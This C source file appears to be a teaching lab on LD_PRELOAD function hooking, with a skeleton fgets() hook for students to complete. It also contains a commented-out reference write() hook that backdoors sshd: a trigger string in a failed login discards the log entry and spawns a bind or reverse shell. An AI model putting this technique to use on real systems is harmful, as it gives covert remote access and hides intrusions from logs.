#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include <arpa/inet.h>


/**
*  TODO: Complete this fgets() library function hook
*
*  Hook fgets() so that if the string "hello" is a substring of char *s, the char* that fgets()
*  will return is: "You've been hooked!"
*
*  Test this hook in echo-input.c. Make a program that reads from stdin and prints the input to stdout.
*  When the user enters "hello" in stdin, they should see "You've been hooked!" appear in stdout.
*  When the user enters a string that does not contain "hello" as a substring, they should see the original string
*  appear in stdout (i.e. fgets() behaves normally).
*
*  Use LD_PRELOAD to dynamically inject the hook into all running processes as you've seen
*  in the demo and tutorial.
*
*  Hint: Note that when our hooked fgets() is called, char *s, is an empty buffer. Calling the 
*  libc fgets() will populate the s buffer.
*
*  Also note that you don't have to follow the comments. If you have a different structure for completing
*  the tasks, you can use that.
* 
*/
char *fgets(char *s, int size, FILE *stream)
{

    ;

     // (1 )declare function pointer to fgets()
     

     // (2) set function pointer to point to the libc fgets()
    

   
     // (3) call the libc fgets() with the arguments passed to the hooked fgets() 
     //     and save the returned char* in a variable 
    

     // (4) if "hello" is a substring of s, store the hooked message in s (you can use strncpy)
     

     // (5) return the saved char* from (3)

     
}








/**
* For reference, I have provided the write() hook from the demo/lab
*/

/**
 * Hooked write() function
 * 
 * sshd calls write() with buf containing ssh hostname as a substring. This occurs when logging
 * ssh attempt to auth.log .
 * Example entry added to auth.log: 
 * "Failed password for invalid user invaliduser"
 *
 * This allows us (the attacker) to use a trigger (hostname) for enabling the backdoor (reverse-shell)
 */

 /*
ssize_t write(int fildes, const void *buf, size_t nbytes)
{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); // declare function pointer to new_write()

    ssize_t result; 

    new_write = dlsym(RTLD_NEXT, "write"); // set new_write to point to the C stdlib write() 


    // looks for KEY_4 as a substring in buf

    // used for spawning bind ipv4 shell
    char *bind4 = strstr(buf, KEY_4);

    // used for spawning reverse ipv4 shell
    char *rev4 = strstr(buf, KEY_R_4);

    if (bind4 != NULL) // substring KEY_4 found in buf
    {
        // failed ssh attempt will try to write() to log file
        // we redirect the write to /dev/null (black hole/does nothing)
        // and then spawn an ipv4 bind shell
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_bind();
    }


    else if (rev4 != NULL) // substring KEY_R_4 found in buf
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_rev();
    }

    else
    {
        result = new_write(fildes, buf, nbytes); // if trigger not activated, write() behaves as normal
    }

    return result; // to sshd daemon it seems like everything is normal
}


*/






